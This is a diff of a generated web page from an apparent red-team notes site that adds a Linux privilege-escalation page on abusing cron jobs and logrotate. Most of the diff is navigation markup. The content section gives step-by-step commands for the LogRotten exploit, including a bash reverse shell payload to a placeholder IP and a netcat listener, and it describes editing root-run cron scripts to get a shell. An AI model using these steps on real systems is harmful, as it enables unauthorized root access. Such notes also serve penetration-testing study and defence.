@@ -12,31 +12,31 @@
         <meta name="author" content="yunniperka">
       
       
-        <link rel="canonical" href="https://yunniperka.github.io/RedHub/Windows/lateral-movement/">
+        <link rel="canonical" href="https://yunniperka.github.io/RedHub/Linux/privilege-escalation/Programs_Jobs_and_Services/">
       
       
-        <link rel="prev" href="../persistence/">
+        <link rel="prev" href="../Capabilities_Abuse/">
       
       
-        <link rel="next" href="../evasion/">
+        <link rel="next" href="../Miscellaneous_Techniques/">
       
       
         
       
       
-      <link rel="icon" href="../../assets/images/favicon.png">
+      <link rel="icon" href="../../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
     
     
       
-        <title>Lateral Movement - RedHub</title>
+        <title>Programs, Jobs and Services - RedHub</title>
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.484c7ddc.min.css">
       
         
-        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
       
       
 
@@ -55,9 +55,9 @@
       
     
     
-      <link rel="stylesheet" href="../../stylesheets/custom.css">
+      <link rel="stylesheet" href="../../../stylesheets/custom.css">
     
-    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -81,6 +81,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#programs-jobs-and-services" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -93,7 +98,7 @@
 
 <header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="../.." title="RedHub" class="md-header__button md-logo" aria-label="RedHub" data-md-component="logo">
+    <a href="../../.." title="RedHub" class="md-header__button md-logo" aria-label="RedHub" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -113,7 +118,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Lateral Movement
+              Programs, Jobs and Services
             
           </span>
         </div>
@@ -205,7 +210,7 @@
 
 <nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../.." title="RedHub" class="md-nav__button md-logo" aria-label="RedHub" data-md-component="logo">
+    <a href="../../.." title="RedHub" class="md-nav__button md-logo" aria-label="RedHub" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -223,7 +228,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../.." class="md-nav__link">
+      <a href="../../.." class="md-nav__link">
         
   
   
@@ -247,10 +252,8 @@
       
   
   
-    
   
   
-  
     
     
       
@@ -271,11 +274,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
         
           
           <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
@@ -296,7 +299,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_2">
             <span class="md-nav__icon md-icon"></span>
             
@@ -379,7 +382,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../privilege-escalation/Enumerating_Attack_Vectors/" class="md-nav__link">
+      <a href="../../../Windows/privilege-escalation/Enumerating_Attack_Vectors/" class="md-nav__link">
         
   
   
@@ -407,7 +410,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../privilege-escalation/Built-in-Groups_Abuse/" class="md-nav__link">
+      <a href="../../../Windows/privilege-escalation/Built-in-Groups_Abuse/" class="md-nav__link">
         
   
   
@@ -435,7 +438,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../privilege-escalation/Excessive_User_Rights_Abuse/" class="md-nav__link">
+      <a href="../../../Windows/privilege-escalation/Excessive_User_Rights_Abuse/" class="md-nav__link">
         
   
   
@@ -463,7 +466,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../privilege-escalation/File_System_ACLs/" class="md-nav__link">
+      <a href="../../../Windows/privilege-escalation/File_System_ACLs/" class="md-nav__link">
         
   
   
@@ -491,7 +494,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../privilege-escalation/Living_off_the_Land/" class="md-nav__link">
+      <a href="../../../Windows/privilege-escalation/Living_off_the_Land/" class="md-nav__link">
         
   
   
@@ -519,7 +522,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../privilege-escalation/Services_Hijacking/" class="md-nav__link">
+      <a href="../../../Windows/privilege-escalation/Services_Hijacking/" class="md-nav__link">
         
   
   
@@ -547,7 +550,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../privilege-escalation/User_Account_Control_%28UAC%29/" class="md-nav__link">
+      <a href="../../../Windows/privilege-escalation/User_Account_Control_%28UAC%29/" class="md-nav__link">
         
   
   
@@ -583,7 +586,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../persistence/" class="md-nav__link">
+      <a href="../../../Windows/persistence/" class="md-nav__link">
         
   
   
@@ -608,17 +611,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../../../Windows/lateral-movement/" class="md-nav__link">
         
   
   
@@ -634,7 +630,6 @@
   
 
       </a>
-      
     </li>
   
 
@@ -647,7 +642,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../evasion/" class="md-nav__link">
+      <a href="../../../Windows/evasion/" class="md-nav__link">
         
   
   
@@ -679,8 +674,10 @@
       
   
   
+    
   
   
+  
     
     
       
@@ -701,11 +698,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
         
           
           <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
@@ -726,7 +723,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_3">
             <span class="md-nav__icon md-icon"></span>
             
@@ -744,7 +741,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Linux/evasion/" class="md-nav__link">
+      <a href="../../evasion/" class="md-nav__link">
         
   
   
@@ -772,7 +769,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Linux/lateral-movement/" class="md-nav__link">
+      <a href="../../lateral-movement/" class="md-nav__link">
         
   
   
@@ -800,7 +797,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Linux/persistence/" class="md-nav__link">
+      <a href="../../persistence/" class="md-nav__link">
         
   
   
@@ -825,8 +822,10 @@
                 
   
   
+    
   
   
+  
     
     
       
@@ -848,11 +847,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4" checked>
         
           
           <label class="md-nav__link" for="__nav_3_4" id="__nav_3_4_label" tabindex="0">
@@ -873,7 +872,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_4_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_4_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_3_4">
             <span class="md-nav__icon md-icon"></span>
             
@@ -891,7 +890,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Linux/privilege-escalation/Enumerating_Attack_Vectors/" class="md-nav__link">
+      <a href="../Enumerating_Attack_Vectors/" class="md-nav__link">
         
   
   
@@ -919,7 +918,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Linux/privilege-escalation/Privileged_Groups/" class="md-nav__link">
+      <a href="../Privileged_Groups/" class="md-nav__link">
         
   
   
@@ -947,7 +946,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Linux/privilege-escalation/Environment_Variables_Abuse/" class="md-nav__link">
+      <a href="../Environment_Variables_Abuse/" class="md-nav__link">
         
   
   
@@ -975,7 +974,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Linux/privilege-escalation/Capabilities_Abuse/" class="md-nav__link">
+      <a href="../Capabilities_Abuse/" class="md-nav__link">
         
   
   
@@ -1000,10 +999,37 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../../Linux/privilege-escalation/Programs_Jobs_and_Services/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Programs, Jobs and Services
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -1019,6 +1045,48 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#cronjob-abuse" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CronJob Abuse
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#logrotate-abuse" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Logrotate Abuse
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1031,7 +1099,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Linux/privilege-escalation/Miscellaneous_Techniques/" class="md-nav__link">
+      <a href="../Miscellaneous_Techniques/" class="md-nav__link">
         
   
   
@@ -1097,7 +1165,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../AD/" class="md-nav__link ">
+            <a href="../../../AD/" class="md-nav__link ">
               
   
   
@@ -1199,7 +1267,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Web/attacks/" class="md-nav__link">
+      <a href="../../../Web/attacks/" class="md-nav__link">
         
   
   
@@ -1257,7 +1325,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../Networking/" class="md-nav__link ">
+            <a href="../../../Networking/" class="md-nav__link ">
               
   
   
@@ -1330,7 +1398,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../Cloud/" class="md-nav__link ">
+            <a href="../../../Cloud/" class="md-nav__link ">
               
   
   
@@ -1374,7 +1442,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Containers/" class="md-nav__link">
+      <a href="../../../Containers/" class="md-nav__link">
         
   
   
@@ -1402,7 +1470,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Virtualization/" class="md-nav__link">
+      <a href="../../../Virtualization/" class="md-nav__link">
         
   
   
@@ -1447,9 +1515,51 @@
 
 
 
-  <h1>Lateral Movement</h1>
-
-
+<h1 id="programs-jobs-and-services">Programs, Jobs and Services</h1>
+<h2 id="cronjob-abuse"><strong>CronJob Abuse</strong></h2>
+<blockquote>
+<p>Scheduled jobs, typically used for administrative tasks, creating backups, cleaning directories etc</p>
+<p>The <code>crontab</code> command can create a cron file, which will be run by the cron daemon on the schedule specified</p>
+<p>When created, the cron file will be created in /var/spool/cron for the specific user that creates it</p>
+<p>Each entry in the crontab file requires six items in the following order: <code>minutes, hours, days, months, weeks, commands</code>.
+</p>
+</blockquote>
+<p><strong>Exploiting Cronjobs:</strong></p>
+<ul>
+<li>By using <code>pspy</code> we can view running processes and commands run by others users without the need for root privileges</li>
+<li>CronJobs can be abused by analyzing their behaviour and the files they interact with</li>
+<li>Suppose a cronjob runs a backup script as root periodically.</li>
+<li>If we can interact with any resources handled by the script (or the script itself) we may be able to edit the logic of such script in order to get a reverse shell as the user running such cronjob (root)</li>
+</ul>
+<hr />
+<h2 id="logrotate-abuse"><strong>Logrotate Abuse</strong></h2>
+<blockquote>
+<p>logrotate is a tool (typically ran as a cronjob) used to manage all logs in /var/logs</p>
+<p>Its global settings configuration file is located at <code>/etc/logrotate.conf</code>, the <code>/etc/logrotate.d/</code> instead contains the configuration files for all forced rotations (after the first one)
+</p>
+</blockquote>
+<p><strong>Exploiting logrotate with LogRotten:</strong></p>
+<ul>
+<li><strong>Prerequisites:</strong>  logrotate must run as <code>root</code> and we need <code>write permissions</code> on the logrotate log files</li>
+<li><strong>Vulnerable versions:</strong> <code>3.8.6</code> <code>3.11.0</code> <code>3.15.0</code> <code>3.18.0</code></li>
+<li><strong>Exploitation steps:</strong><ol>
+<li>Use <code>pspy</code> to verify that a <code>cronjob</code> running <code>logrotate</code> as <code>root</code> is ran periodically</li>
+<li>Identify the logfile being rotated periodically: such files typically have a filename format like <code>filename.log.1</code> for the first rotation, then <code>filename.log.2</code> and so on</li>
+<li><code>git clone https://github.com/whotwagner/logrotten.git</code></li>
+<li><code>gcc logrotten.c -o logrotten</code></li>
+<li><code>echo 'bash -i &gt;&amp; /dev/tcp/your-ip/nc-port 0&gt;&amp;1' &gt; payload</code></li>
+<li>Start the netcat listener on the attacker machine: nc -lvnp 9001</li>
+<li>Determine the option used by logrotate (create or compress): <code>grep "create\|compress" /etc/logrotate.conf | grep -v "#"</code></li>
+<li>Adapt the payload based on the option specified in the <code>logrotate.conf</code> file:<ul>
+<li>Create: <code>./logrotten -p ./payload /tmp/log/pwnme.log</code></li>
+<li>Compress: <code>./logrotten -p ./payload -c -s 4 /tmp/log/pwnme.log</code></li>
+</ul>
+</li>
+<li>Wait for the rotation and get the reverse shell as root</li>
+<li><strong><em>Disclaimer:</em></strong> sometimes you might need to edit the logfile (add a blank space) in order to trigger the rotation</li>
+</ol>
+</li>
+</ul>
 
 
 
@@ -1499,10 +1609,10 @@
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.sections", "navigation.indexes", "toc.integrate", "navigation.tabs.sticky", "navigation.tracking"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.sections", "navigation.indexes", "toc.integrate", "navigation.tabs.sticky", "navigation.tracking"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
       
     
   </body>
